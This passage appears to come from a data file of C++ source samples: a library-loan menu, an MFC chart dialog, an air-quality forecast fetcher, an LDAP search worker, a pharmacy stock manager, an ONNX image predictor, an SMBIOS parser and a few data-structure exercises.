1 || tanggal > 31)\n    {\n        cout << \"\\tTanggal salah!\\n\";\n        pemilihan_berulang();\n        return;\n    }\n\n    cout << \"\\tJumlah buku yang ingin dipinjam: \";\n    cin >> jumlah;\n\n    for (int i = 0; i < jumlah; i++)\n    {\n        cout << \"\\n\\tInputkan kode buku: \";\n        cin >> kode;\n        if (kode >= 1 && kode <= 5)\n        {\n            cout << \"\\tAnda meminjam buku: \" << daftar[kode - 1] << \"\\n\";\n        }\n        else\n        {\n            cout << \"\\tKode buku tidak valid.\\n\";\n        }\n    }\n\n    cout << \"\\tTanggal kembali: \" << ((tanggal + 7) % 31) << \"\\n\";\n    pemilihan_berulang();\n}\n\n// Fungsi pengembalian buku\nvoid pengembalian_buku()\n{\n    system(\"cls\");\n    cout << \"\\t====================\\n\";\n    cout << \"\\t\\tPENGEMBALIAN BUKU\\n\";\n    cout << \"\\t====================\\n\";\n\n    string nama;\n    int jumlah, kode;\n\n    cout << \"\\n\\tNama: \";\n    cin >> nama;\n    cout << \"\\tJumlah buku yang ingin dikembalikan: \";\n    cin >> jumlah;\n\n    for (int i = 0; i < jumlah; i++)\n    {\n        cout << \"\\n\\tInputkan kode buku: \";\n        cin >> kode;\n        if (kode >= 1 && kode <= 5)\n        {\n            cout << \"\\tAnda mengembalikan buku: \" << daftar[kode - 1] << \"\\n\";\n        }\n        else\n        {\n            cout << \"\\tKode buku tidak valid.\\n\";\n        }\n    }\n\n    pemilihan_berulang();\n}\n\n// Fungsi untuk keluar program\nvoid keluar_program()\n{\n    system(\"cls\");\n    cout << \"\\n\\tTerima kasih atas kunjungan Anda!\\n\";\n    exit(0);\n}\n\n// Fungsi untuk memilih kembali\nvoid pemilihan_berulang()\n{\n    char pilih;\n    cout << \"\\n\\tKembali ke menu utama? (Y/N): \";\n    cin >> pilih;\n\n    if (pilih == 'Y' || pilih == 'y')\n    {\n        menu_utama();\n    }\n    else\n    {\n        keluar_program();\n    }\n}\n\n// Fungsi utama\nint main()\n{\n    menu_utama();\n    return 0;\n}\n",
    "///////////////////////////////////////////////////////////////////////////////////////////////////\n// Copyright 2006 Advanced Software Engineering Limited\n//\n// You may use and modify the code in this file in your application, provided the code and\n// its modifications are used only in conjunction with ChartDirector. Usage of this software\n// is subjected to the terms and condition of the ChartDirector license.\n///////////////////////////////////////////////////////////////////////////////////////////////////\n\n///////////////////////////////////////////////////////////////////////////////////////////////////\n// CHotSpotDlg Implementation\n//\n// The purpose of the hot spot dialog is to list out hot spot parameters. It is a simple\n// dialog with just a list control and an OK button.\n///////////////////////////////////////////////////////////////////////////////////////////////////\n\n#include \"stdafx.h\"\n#include \"chartdir.h\"\n#include \"udl1config.h\"\n#include \"ChartViewer.h\"\n#include \"HotSpotDlg.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#undef THIS_FILE\nstatic char THIS_FILE[] = __FILE__;\n#endif\n\n/////////////////////////////////////////////////////////////////////////////\n// CHotSpotDlg dialog\n\n\nCHotSpotDlg::CHotSpotDlg(CWnd* pParent /*=NULL*/)\n\t: CDialog(CHotSpotDlg::IDD, pParent)\n{\n\t//{{AFX_DATA_INIT(CHotSpotDlg)\n\t\t// NOTE: the ClassWizard will add member initialization here\n\t//}}AFX_DATA_INIT\n\n\thotSpotData = 0;\n}\n\nvoid CHotSpotDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialog::DoDataExchange(pDX);\n\t//{{AFX_DATA_MAP(CHotSpotDlg)\n\tDDX_Control(pDX, IDC_PARAMLIST, m_ParamList);\n\t//}}AFX_DATA_MAP\n}\n\n\nBEGIN_MESSAGE_MAP(CHotSpotDlg, CDialog)\n\t//{{AFX_MSG_MAP(CHotSpotDlg)\n\t\t// NOTE: the ClassWizard will add message map macros here\n\t//}}AFX_MSG_MAP\nEND_MESSAGE_MAP()\n\n/////////////////////////////////////////////////////////////////////////////\n// CHotSpotDlg message handlers\n\n/////////////////////////////////////////////////////////////////////////////\n// CHotSpotDlg implementation\n\nvoid CHotSpotDlg::SetData(ImageMapHandler *data)\n{\n\t// set the data for the dialog\n\thotSpotData = data;\n}\n\nBOOL CHotSpotDlg::OnInitDialog()\n{\n\tCDialog::OnInitDialog();\n\n\t//\n\t// fill the list control with data from the hot spot\n\t//\n\n\tm_ParamList.InsertColumn(0, _T(\"Param\"), LVCFMT_LEFT, 75);\n\tm_ParamList.InsertColumn(1, _T(\"Value\"), LVCFMT_LEFT, 240);\n\n\tif (0!= hotSpotData)\n\t{\n\t\tint i = 0;\n\t\tconst char *key;\n\t\twhile (0 != (key = hotSpotData->getKey(i)))\n\t\t{\n\t\t\t//remember to use UTF8toTCHAR for possible conversion, as ChartDirector\n\t\t\t//uses UTF8, while MFC uses TCHAR\n\t\t\tm_ParamList.InsertItem(i, UTF8toTCHAR(key));\n\t\t\tm_ParamList.SetItemText(i, 1, UTF8toTCHAR(hotSpotData->getValue(i)));\n\t\t\t++i;\n\t\t}\n\t}\n\n\treturn TRUE;\n}\n\n",
    "#include \"burn_functions.h\"\n#include <ArduinoJson.h>\n#include <HTTPClient.h>\n\nvoid fetchAndParseBurnData() {\n  WiFiClient client; //Create a WiFiClient instance\n  HTTPClient http;\n\n  ESP_LOGI(\"burn_category\", \"Starting HTTP request...\");\n  \n  //Use the correct begin() method for LibreTiny's HTTPClient\n  http.begin(client, \"https://sonomatech-production.s3.amazonaws.com/sacramento/airquality_org/cbyb-widget/burncheckForecast.txt\");\n  http.useHTTP10(true);\n  \n  ESP_LOGI(\"burn_category\", \"Sending HTTP GET request...\");\n  int httpCode = http.GET();\n  \n  if (httpCode == HTTP_CODE_OK) {\n    ESP_LOGI(\"burn_category\", \"HTTP GET request successful.\");\n  \n    int len = http.getSize();\n    ESP_LOGI(\"burn_category\", \"Content length: %d bytes\", len);\n  \n    String payload;\n    WiFiClient *stream = http.getStreamPtr();\n  \n    // Read the data manually.\n    while (stream->available()) {\n      payload += (char)stream->read();\n    }\n  \n    ESP_LOGI(\"burn_category\", \"Raw response: %s\", payload.c_str());\n  \n    //Remote \"burncheckForecastCallback(\" and \")\" from the response\n    payload.remove(0, strlen(\"burncheckForecastCallback(\"));\n    payload.remove(payload.length() - 1);\n    ESP_LOGI(\"burn_category\", \"Cleaned response: %s\", payload.c_str());\n  \n    // Adjust JSON doc size based on payload size or use a larger buffer.\n    DynamicJsonDocument doc(len + 512); // Add a buffer for extra charactors or use a fixed larger size if needed\n    DeserializationError error = deserializeJson(doc, payload);\n  \n    if (!error) {\n      ESP_LOGI(\"burn_category\", \"JSON parsing successful.\");\n  \n      int burn_cat = doc[\"burn_forecast\"][\"today\"][\"category\"].as<int>();\n      ESP_LOGI(\"burn_category\", \"Burn category: %d\", burn_cat);\n      id(burn_category) = burn_cat; // Update the global variable\n  \n      // Now that burn_category is updated, you need to trigger the update of your text sensor and sensor\n      id(burn_status).publish_state(id(burn_status).state);\n      id(burn_status_sensor).publish_state(id(burn_status_sensor).state);\n    } else {\n      ESP_LOGE(\"burn_category\", \"JSON deserialization failed: %s\", error.c_str());\n    }\n  } else {\n    ESP_LOGE(\"burn_category\", \"[HTTP] GET... failed, error: %s\", http.errorToString(httpCode).c_str());\n  }\n  http.end();\n  ESP_LOGI(\"burn_category\", \"HTTP connection closed.\");\n}\n",
    "#include <napi.h>\n\nextern \"C\" {\n    #include <ldap.h>\n}\n\n#include \"async-ldap-search.h\"\n#include <atomic>\n#include <functional>\n#include <thread>\n#include \"ldap-result.h\"\n\nAsyncSearchWorker::AsyncSearchWorker(const Napi::Env& env, LDAP* ld, std::string filter, std::string base, SEARCH_SCOPES scope, std::function<void()> func): Napi::AsyncWorker(env),\n    m_deferred(Napi::Promise::Deferred::New(env)),\n    target_ldap_client{ld},\n    filter{filter},\n    base{base},\n    scope{scope},\n    once_done{func}\n{}\n\nAsyncSearchWorker::~AsyncSearchWorker(){\n}\n\nNapi::Promise AsyncSearchWorker::getPromise(){\n    return this->m_deferred.Promise();\n}\n\n\nvoid AsyncSearchWorker::OnOK(){\n    this->m_deferred.Resolve(Napi::Number::New(Env(),3));\n}\n\nvoid AsyncSearchWorker::OnError(const Napi::Error& err){\n    this->m_deferred.Reject(err.Value());\n}\n\nvoid AsyncSearchWorker::Execute(){\n    struct timeval timeout = {\n        .tv_sec = 100,\n        .tv_usec = 0\n    };\n\n    LDAPMessage* answer;\n    char* attributes[] = {NULL};\n    int attributes_only = 0;\n\n    int ldap_search_status = ldap_search_ext_s(this->target_ldap_client, this->base.c_str(), std::to_underlying(this->scope), this->filter.c_str(),attributes, attributes_only, NULL, NULL, &timeout, -1, &answer);\n    LDAP_Response* x = new LDAP_Response(this->target_ldap_client,answer);\n    delete x;\n    //LDAP_Response::free_response(this->target_ldap_client,answer);\n    \n    this->once_done();\n}",
    "/*\r\n * This program is free software: you can redistribute it and/or modify\r\n * it under the terms of the GNU General Public License as published by\r\n * the Free Software Foundation, either version 3 of the License, or\r\n * (at your option) any later version.\r\n *\r\n * This program is distributed in the hope that it will be useful,\r\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\r\n * GNU General Public License for more details.\r\n *\r\n * You should have received a copy of the GNU General Public License\r\n * along with this program. If not, see <https://www.gnu.org/licenses/>.\r\n *\r\n * Created by: BAMOUH Ayoub\r\n */\r\n\r\n// Inclusion des biblioth\u00e8ques standard n\u00e9cessaires\r\n#include <iostream>  // Pour les entr\u00e9es et sorties standard\r\n#include <fstream>   // Pour la manipulation des fichiers\r\n#include <vector>    // Pour l'utilisation des conteneurs vector\r\n#include <string>    // Pour manipuler des cha\u00eenes de caract\u00e8res\r\n#include <ctime>     // Pour g\u00e9rer la date et l'heure\r\n#include <iomanip>   // Pour le formatage des sorties\r\n#include <limits>    // Pour g\u00e9rer les limites des entr\u00e9es utilisateur\r\n#include <sstream>   // Pour manipuler les flux de cha\u00eenes\r\n#include <windows.h> // Inclure cette biblioth\u00e8que pour manipuler les couleurs de la console\r\n\r\nusing namespace std;\r\n\r\n// Fonction pour afficher la banni\u00e8re d'introduction\r\nvoid displayBanner() {\r\n    cout << \"+---------------------------------------------------------------------+\" << endl;\r\n    cout << \"| Created by : Mr. BAMOUH Ayoub                                       |\" << endl;\r\n    cout << \"| Date       : 01/01/2025                                             |\" << endl;\r\n    cout << \"| Application for handling Medicines Spare in your Pharmacy or        |\" << endl;\r\n    cout << \"| Hospital for beginners and small businesses                         |\" << endl;\r\n    cout << \"+---------------------------------------------------------------------+\" << endl;\r\n}\r\n\r\nvoid displayGPLNotice() {\r\n    cout << \"+---------------------------------------------------------------------+\" << endl;\r\n    cout << \"| This program is licensed under the GNU General Public License (GPL).|\" << endl;\r\n    cout << \"| See https://www.gnu.org/licenses/gpl-3.0.en.html for details.       |\" << endl;\r\n    cout << \"+---------------------------------------------------------------------+\" << endl;\r\n}\r\n\r\n// Fonction pour changer la couleur de la sortie de la console\r\nvoid setColor(int color) {\r\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);  // R\u00e9cup\u00e9rer le handle de la console\r\n    SetConsoleTextAttribute(hConsole, color);  // Changer la couleur de texte\r\n}\r\n\r\n// D\u00e9finition de la classe Medicament\r\nclass Medicament {\r\nprivate:\r\n    string name;               // Nom du m\u00e9dicament\r\n    string category;           // Cat\u00e9gorie du m\u00e9dicament\r\n    int stockLevel;            // Niveau de stock disponible\r\n    string expirationDate;     // Date de p\u00e9remption du m\u00e9dicament\r\n    string lotNumber;          // Num\u00e9ro de lot\r\n    string manufacturer;       // Fabricant du m\u00e9dicament\r\n    string usageInstructions;  // Instructions d'utilisation\r\n    string id;                 // Identifiant unique pour chaque m\u00e9dicament\r\n\r\npublic:\r\n    // Constructeur pour initialiser un m\u00e9dicament avec ses attributs\r\n    Medicament(string n, string c, int s, string e, string l, string m, string u, string i)\r\n        : name(n), category(c), stockLevel(s), expirationDate(e), lotNumber(l), manufacturer(m), usageInstructions(u), id(i) {}\r\n\r\n    // Accesseurs pour obtenir les informations sur le m\u00e9dicament\r\n    string getName() const { return name; }\r\n    string getCategory() const { return category; }\r\n    int getStockLevel() const { return stockLevel; }\r\n    string getExpirationDate() const { return expirationDate; }\r\n    string getLotNumber() const { return lotNumber; }\r\n    string getManufacturer() const { return manufacturer; }\r\n    string getUsageInstructions() const { return usageInstructions; }\r\n    string getId() const { return id; }\r\n\r\n    // Affichage des informations du m\u00e9dicament dans un format structur\u00e9\r\n    void display() const {\r\n        cout << \"| \" << left << setw(15) << id\r\n             << \"    | \" << left << setw(20) << name\r\n             << \" | \" << left << setw(15) << category\r\n             << \"    | \" << left << setw(6) << stockLevel\r\n             << \"| \" << left << setw(12) << expirationDate\r\n             << \"       | \" << left << setw(10) << lotNumber\r\n             << \" | \" << left << setw(15) << manufacturer\r\n             << \" | \" << left << setw(25) << usageInstructions\r\n             << \"|\\n\";\r\n        cout << \"+---------------------+----------------------+--------------------+-------+--------------------+------------+-----------------+--------------------------+\\n\";\r\n    }\r\n\r\n    // V\u00e9rifier si la date de p\u00e9remption est proche (moins de 30 jours)\r\n    bool isExpiringSoon() const {\r\n        time_t now = time(0",
    "#include \"binary_predictor.h\"\n\n\nusing namespace cv;\nusing namespace std;\nusing namespace Ort;\n\n\nstatic Mat pad_to_multiple_of_n(const Mat& image, const int n, int* pad_info)\n{\n    int original_height = image.rows;\n    int original_width = image.cols;\n    \n    int target_width = ((original_width + n - 1) / n) * n;\n    int target_height = ((original_height + n - 1) / n) * n;\n\n    Mat padded_image(target_height, target_width, CV_8UC3, Scalar(255,255,255));\n\n    int start_x = (target_width - original_width) / 2;\n    int start_y = (target_height - original_height) / 2;\n\n    image.copyTo(padded_image(Rect(start_x, start_y, original_width, original_height)));\n    pad_info[0] = start_x;\n    pad_info[1] = start_y;\n    pad_info[2] = original_height;\n    pad_info[3] = original_width;\n    return padded_image;\n}\n\nUnetCNN::UnetCNN(const string& model_path)\n{\n    if (model_path.empty()) \n    {\n        std::cout << \"onnx path error\" << std::endl;\n    }\n\n    sessionOptions.SetGraphOptimizationLevel(ORT_ENABLE_BASIC);\n    // \u52a0\u8f7d\u6a21\u578b\n    std::wstring_convert <std::codecvt_utf8<wchar_t>> converter;\n#ifdef _WIN32\n    std::wstring w_model_path = converter.from_bytes(model_path);\n    ort_session = new Ort::Session(env, w_model_path.c_str(), sessionOptions);\n#else\n    ort_session = new Ort::Session(env, model_path.c_str(), sessionOptions);\n#endif\n}\n\nvoid UnetCNN::preprocess(const Mat& srcimg)\n{\n    Mat img = pad_to_multiple_of_n(srcimg, 32, this->pad_info);\n    this->input_h = img.rows;\n    this->input_w = img.cols;\n    vector<cv::Mat> bgrChannels(3);\n    split(img, bgrChannels);\n    for (int c = 0; c < 3; c++)\n    {\n        bgrChannels[c].convertTo(bgrChannels[c], CV_32FC1, 1 / 255.0);\n    }\n\n    const int image_area = this->input_h * this->input_w;\n    this->input_image.clear();\n    this->input_image.resize(3 * image_area);\n    size_t single_chn_size = image_area * sizeof(float);\n    memcpy(this->input_image.data(), (float *)bgrChannels[2].data, single_chn_size);\n    memcpy(this->input_image.data() + image_area, (float *)bgrChannels[1].data, single_chn_size);\n    memcpy(this->input_image.data() + image_area * 2, (float *)bgrChannels[0].data, single_chn_size);\n}\n\nMat UnetCNN::predict(const Mat& srcimg)\n{\n    this->preprocess(srcimg);\n    std::vector<int64_t> input_img_shape = {1, 3, this->input_h, this->input_w};\n    Value input_tensor_ = Value::CreateTensor<float>(memory_info_handler, this->input_image.data(), this->input_image.size(), input_img_shape.data(), input_img_shape.size());\n\n    vector<Value> ort_outputs = this->ort_session->Run(runOptions, this->input_names.data(), &input_tensor_, this->input_names.size(), this->output_names.data(), this->output_names.size());\n\n    std::vector<int64_t> out_shape = ort_outputs[0].GetTensorTypeAndShapeInfo().GetShape();\n    const int out_h = out_shape[2];\n    const int out_w = out_shape[3];\n    float* pred = ort_outputs[0].GetTensorMutableData<float>();   \n    Mat out = Mat(out_h, out_w, CV_32FC1, pred);\n    Mat cropped_image = this->postprocess(out);\n    out.release();\n    vector<Mat> channel_mats = {cropped_image, cropped_image, cropped_image};\n    Mat out_img;\n    merge(channel_mats, out_img);\n    out_img.convertTo(out_img, CV_8UC3);\n    return out_img;\n}\n\nMat UnetCNN::postprocess(Mat& img)\n{\n    double min_value, max_value;\n\tminMaxLoc(img, &min_value, &max_value, 0, 0);\n    img = 1 - (img - min_value) / (max_value - min_value);\n    img = img * 255 + 0.5;\n    img.setTo(0, img<0);\n    img.setTo(255, img>255);\n    Mat cropped_image;\n    img(Rect(this->pad_info[0], this->pad_info[1], this->pad_info[3], this->pad_info[2])).copyTo(cropped_image);\n    return cropped_image;\n}",
    "#include \"smbios_parser.hpp\"\r\n#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <iomanip>\r\n#include <Windows.h>\r\n#include <wbemidl.h>\r\n#include \"json.hpp\" \r\n\r\n#pragma comment(lib, \"wbemuuid.lib\")\r\n\r\nusing json = nlohmann::json;\r\n\r\nSMBIOSParser::SMBIOSParser() {\r\n    // Initialize \r\n    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);\r\n    if (FAILED(hres)) {\r\n        throw std::runtime_error(\"Failed to initialize COM library.\");\r\n    }\r\n}\r\n\r\nSMBIOSParser::~SMBIOSParser() {\r\n    CoUninitialize();\r\n}\r\n\r\nvoid SMBIOSParser::loadData() {\r\n    auto smbiosData = fetchSMBIOSData();\r\n    parseSMBIOSData(smbiosData);\r\n}\r\n\r\nvoid SMBIOSParser::parseSMBIOSData(const std::vector<uint8_t>& data) {\r\n    size_t offset = 0;\r\n    while (offset < data.size()) {\r\n        SMBIOSStructure structure;\r\n        const uint8_t* ptr = data.data() + offset;\r\n\r\n        structure.type = ptr[0];\r\n        structure.length = ptr[1];\r\n        structure.handle = *(uint16_t*)&ptr[2];\r\n\r\n\r\n        size_t endOfFormattedArea = offset + structure.length;\r\n        const char* stringsStart = reinterpret_cast<const char*>(data.data() + endOfFormattedArea);\r\n\r\n        // Extract strings\r\n        while (*stringsStart != '\\0') {\r\n            structure.strings.push_back(stringsStart);\r\n            stringsStart += strlen(stringsStart) + 1;\r\n        }\r\n\r\n        offset = endOfFormattedArea + structure.strings.size() + 1; \r\n        structures.push_back(structure);\r\n    }\r\n}\r\n\r\nstd::vector<uint8_t> SMBIOSParser::fetchSMBIOSData() {\r\n    // WMI to query SMBIOS data\r\n    IWbemLocator* locator = nullptr;\r\n    IWbemServices* services = nullptr;\r\n    IEnumWbemClassObject* enumerator = nullptr;\r\n\r\n    HRESULT hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&locator);\r\n    if (FAILED(hres)) {\r\n        handleWMIError(\"Failed to create IWbemLocator instance.\");\r\n    }\r\n\r\n    hres = locator->ConnectServer(\r\n        BSTR(L\"ROOT\\\\CIMV2\"),\r\n        nullptr, nullptr, nullptr, 0, nullptr, nullptr, &services);\r\n    if (FAILED(hres)) {\r\n        locator->Release();\r\n        handleWMIError(\"Failed to connect to WMI server.\");\r\n    }\r\n\r\n    hres = services->ExecQuery(\r\n        BSTR(L\"WQL\"),\r\n        BSTR(L\"SELECT * FROM Win32_BIOS\"),\r\n        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,\r\n        nullptr, &enumerator);\r\n    if (FAILED(hres)) {\r\n        services->Release();\r\n        locator->Release();\r\n        handleWMIError(\"Failed to execute WMI query.\");\r\n    }\r\n\r\n    std::vector<uint8_t> smbiosData;\r\n    IWbemClassObject* obj = nullptr;\r\n    ULONG returned;\r\n\r\n    while (enumerator->Next(WBEM_INFINITE, 1, &obj, &returned) == WBEM_S_NO_ERROR) {\r\n        VARIANT data;\r\n        hres = obj->Get(L\"SMBIOSBIOSVersion\", 0, &data, nullptr, nullptr);\r\n        if (SUCCEEDED(hres) && (data.vt == VT_BSTR)) {\r\n            smbiosData.assign(data.bstrVal, data.bstrVal + SysStringLen(data.bstrVal));\r\n        }\r\n        VariantClear(&data);\r\n        obj->Release();\r\n    }\r\n\r\n    enumerator->Release();\r\n    services->Release();\r\n    locator->Release();\r\n\r\n    return smbiosData;\r\n}\r\n\r\nvoid SMBIOSParser::displayCommands() const {\r\n    std::cout << \"Available commands:\\n\";\r\n    std::cout << \"  cmds   - Display all user commands\\n\";\r\n    std::cout << \"  table  - View the SMBIOS structure table\\n\";\r\n    std::cout << \"  all    - View all structures\\n\";\r\n    std::cout << \"  [id]   - View the structure with the given ID\\n\";\r\n    std::cout << \"  quit   - Exit the program\\n\";\r\n}\r\n\r\nvoid SMBIOSParser::displaySMBIOSTable() const {\r\n    std::cout << \"SMBIOS Table:\\n\";\r\n    for (const auto& structure : structures) {\r\n        std::cout << \"Type: \" << static_cast<int>(structure.type)\r\n            << \", Length: \" << static_cast<int>(structure.length)\r\n            << \", Handle: \" << structure.handle << \"\\n\";\r\n    }\r\n}\r\n\r\nvoid SMBIOSParser::displayAllStructures() const {\r\n    for (const auto& structure : structures) {\r\n        std::cout << \"Type: \" << static_cast<int>(structure.type)\r\n            << \", Handle: \" << structure.handle << \"\\n\";\r\n        for (const auto& str : structure.strings) {\r\n            std::cout << \"  String: \" << str << \"\\n\";\r\n        }\r\n    }\r\n}\r\n\r\nvoid SMBIOSParser::displayStructureByID(uint16_t id) const {\r\n    for (const auto& structure : structures) {\r\n        if (structure.handle == id) {\r\n            std::cout << \"Found Structure with ID: \" << id << \"\\n\";\r\n            for (const auto& field : structure.fields) {\r\n                std::cout << \"  \" << field.first << \": \" << field.second << \"\\n\";\r\n            }\r\n            return;\r\n        }\r\n    }\r\n    std::cout << \"No structure found with ID: \" << id << \"\\n\";\r\n}\r\n\r\nvoid SMBIOSParser::saveToJSON(const std::string& filename) const {\r\n    json j;\r\n    for (const auto& structure : structures) {\r\n        json s;\r\n        s[\"type\"] = structure.type;\r\n        s[\"handle\"] = structure.handle;\r\n        s[\"fields\"] = structure.fields;\r\n        j[\"structures\"]",
    "#include <type_traits>\n\n#include \"../cpp-units/cpp-units.hpp\"\n\nusing namespace cpp_units::literals;\n\nconstexpr cpp_units::utils::constexpr_string str_l = \"L\";\nconstexpr cpp_units::utils::constexpr_string str_m = \"M\";\nconstexpr cpp_units::utils::constexpr_string str_k = \"K\";\n\nusing pair1 = cpp_units::utils::meta_pair<str_l, 1>;\nusing pair2 = cpp_units::utils::meta_pair<str_m, 2>;\nusing pair3 = cpp_units::utils::meta_pair<str_l, 3>;\n\nusing map1 = cpp_units::utils::meta_map<pair1, pair2>;\nusing map2 = cpp_units::utils::meta_map<pair2, pair1>;\nusing map3 = cpp_units::utils::meta_map<pair1, pair3, pair2>;\nusing map4 = map1::set_t<str_l, 3>;\nusing map5 = map1::set_t<str_k, 4>;\n\nstatic_assert(map1::get_v<str_l> == 1);\nstatic_assert(map1::get_v<str_m> == 2);\nstatic_assert(map3::get_v<str_l> == 3);\nstatic_assert(map4::get_v<str_l> == 3);\nstatic_assert(map5::get_v<str_k> == 4);\nstatic_assert(cpp_units::utils::is_same_map_v<map1, map2>);\nstatic_assert(cpp_units::utils::is_same_map_v<map3, map4>);\n\nusing dim1 = cpp_units::dimension<str_l>;\nusing dim2 = cpp_units::dimension_multiply_t<dim1, dim1>;\nusing dim3 = cpp_units::dimension<str_m>;\nusing dim4 = cpp_units::dimension_multiply_t<dim1, dim3>;\nusing dim5 = cpp_units::dimension_multiply_t<dim3, dim1>;\nusing dim6 = cpp_units::dimension_divide_t<dim1, dim1>;\nusing dim7 = cpp_units::dimension_divide_t<dim3, dim3>;\n\nstatic_assert(cpp_units::is_same_dimension_v<dim1, dim1>);\nstatic_assert(!cpp_units::is_same_dimension_v<dim1, dim2>);\nstatic_assert(cpp_units::is_same_dimension_v<dim4, dim5>);\nstatic_assert(dim1::get_v<str_l> == 1);\nstatic_assert(dim2::get_v<str_l> == 2);\nstatic_assert(dim6::get_v<str_l> == 0);\nstatic_assert(cpp_units::is_same_dimension_v<dim6, dim7>);\nstatic_assert(!cpp_units::utils::is_same_map_v<dim6, dim7>);\n\nint main() {\n    constexpr auto v1 = 1_m;\n    constexpr auto v2 = 20_mm;\n    constexpr auto v3 = v1 - v2;\n    constexpr auto v4 = v1 / v2;\n    constexpr auto v5 = v1 * v2;\n\n    static_assert(cpp_units::is_same_dimension_v<decltype(v4)::dimension, dim6>);\n    static_assert(cpp_units::is_same_dimension_v<decltype(v5)::dimension, dim2>);\n\n    return 0;\n}\n",
    "#include<memory>\n#include<mutex>\n\ntemplate<typename T>\nclass threadsafe_list{\nprivate:\n    struct node{\n        std::shared_ptr<T> data;\n        std::unique_ptr<T> next;\n        std::mutex m;\n\n        node(): next() {}\n        node(T const& value): data(std::make_shared<T>(value)){};\n    };\n    \n    node head;\n\npublic:\n    threadsafe_list(){}\n    ~threadsafe_list(){\n        std::remove_if([](T const&){return true;});\n    }\n\n    threadsafe_list(threadsafe_list const& other)=delete;\n    threadsafe_list& operator=(threadsafe_list const& other)=delete;\n\n    void push_front(T const& value){\n        std::unique_ptr<node> new_node(new node(value));\n        std::lock_guard<std::mutex> lk(head.m);\n        new_node -> next = std::move(head.next);\n        head.next = std::move(new_node);\n    }\n\n    template<typename Function>\n    void for_each(Function f){\n        node* current = &head;\n        std::unique_lock<std::mutex> lk(head.m);\n        while(node* const next=current->next.get()){\n            std::unique_lock<std::mutex> next_lk(next->m);\n            lk.unlock();\n            f(*next->data);\n            current=next;\n            lk=std::move(next_lk);\n        }\n    }\n\n    template<typename Predicate>\n    std::shared_ptr<T> find_first_if(Predicate p){\n        node* current = &head;\n        std::unique_lock<std::mutex> lk(head.m);\n        while(node* const next=current->next.get()){\n            std::unique_lock<std::mutex> next_lk(next->m);\n            lk.unlock();\n            if(p(*next->data)){\n                return next->data;\n            }\n            current=next;\n            lk=std::move(next_lk);\n        }\n        return std::shared_ptr<T>();\n    }\n\n    template<typename Predicate>\n    void remove_if(Predicate p){\n        node* current=&head;\n        std::unique_lock<std::mutex> lk(head.m);\n        while(node* const next=current->next.get())\n        {\n            std::unique_lock<std::mutex> next_lk(next->m);\n            if(p(*next->data))\n            {\n                std::unique_ptr<node> old_next=std::move(current->next);\n                current->next=std::move(next->next);\n                next_lk.unlock();\n            }\n            else\n            {\n                lk.unlock();\n                current=next;\n                lk=std::move(next_lk);\n            }\n        }\n    }\n};\n\nint main(){}",
    "#include <iostream>\nusing namespace std;\n\nclass Heap {\nprivate:\n    int* heap;        // Pointer to the dynamic array\n    int capacity;     // Maximum capacity of the heap\n    int size;         // Current size of the heap\n    bool isMinHeap;   // True for Min-Heap, False for Max-Heap\n\n    // Compare function for heap type\n    bool compare(int parent, int child) {\n        return isMinHeap ? parent > child : parent < child;\n    }\n\n    // Resize the dynamic array\n    void resize() {\n        capacity *= 2;\n        int* newHeap = new int[capacity];\n        for (int i = 0; i < size; i++) {\n            newHeap[i] = heap[i];\n        }\n        delete[] heap;\n        heap = newHeap;\n    }\n\n    // Heapify-up to maintain heap property after insertion\n    void heapifyUp(int index) {\n        int parent = (index - 1) / 2;\n        if (index > 0 && compare(heap[parent], heap[index])) {\n            swap(heap[parent], heap[index]);\n            heapifyUp(parent);\n        }\n    }\n\n    // Heapify-down to maintain heap property after deletion\n    void heapifyDown(int index) {\n        int left = 2 * index + 1;\n        int right = 2 * index + 2;\n        int smallestOrLargest = index;\n\n        if (left < size && compare(heap[smallestOrLargest], heap[left])) {\n            smallestOrLargest = left;\n        }\n\n        if (right < size && compare(heap[smallestOrLargest], heap[right])) {\n            smallestOrLargest = right;\n        }\n\n        if (smallestOrLargest != index) {\n            swap(heap[index], heap[smallestOrLargest]);\n            heapifyDown(smallestOrLargest);\n        }\n    }\n\n    void buildHeap() {\n        for (int i = size / 2 - 1; i >= 0; i--) {\n            heapifyDown(i);\n        }\n    }\n\n\npublic:\n    // Constructor to initialize heap type and default capacity\n    Heap(bool minHeap = false, int initialCapacity = 10)\n        : isMinHeap(minHeap), capacity(initialCapacity), size(0) {\n        heap = new int[capacity];\n    }\n\n    // Destructor to clean up the dynamic array\n    ~Heap() {\n        delete[] heap;\n    }\n\n    // Insert an element into the heap\n    void insert(int value) {\n        if (size == capacity) {\n            resize();\n        }\n        heap[size++] = value;\n        heapifyUp(size - 1);\n    }\n\n    // Get the maximum or minimum element\n    int getExtreme() {\n        if (size == 0) {\n            throw runtime_error(\"Heap is empty!\");\n        }\n        return heap[0];\n    }\n\n    // Delete the maximum or minimum element\n    void deleteExtreme() {\n        if (size == 0) {\n            throw runtime_error(\"Heap is empty!\");\n        }\n        heap[0] = heap[size - 1];\n        size--;\n        heapifyDown(0);\n    }\n\n    // Check if a value is in a given range\n    bool inRange(int low, int high) {\n        for (int i = 0; i < size; i++) {\n            if (heap[i] >= low && heap[i] <= high) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n     void heapSort() {\n        buildHeap(); // Step 1: Build the heap\n        for (int i = size - 1; i >= 1; i--) {\n            swap(heap[0], heap[i]); // Swap the root (max or min) with the last element\n            size--; // Decrease heap size\n            heapifyDown(0); // Restore heap property\n        }\n    }\n\n    // Delete a specific value from the heap\n    void deleteValue(int value) {\n        for (int i = 0; i < size; i++) {\n            if (heap[i] == value) {\n                heap[i] = heap[size - 1];\n                size--;\n                heapifyDown(i);\n                heapifyUp(i);\n                return;\n            }\n        }\n    }\n\n    // Print the heap\n    void printHeap() {\n        for (int i = 0; i < size; i++) {\n            cout << heap[i] << \" \";\n        }\n        cout << endl;\n    }\n};\n\nint main() {\n    // Create a Max-Heap\n    Heap maxHeap(false);\n\n    cout << \"Inserting values into the Max-Heap...\\n\";\n    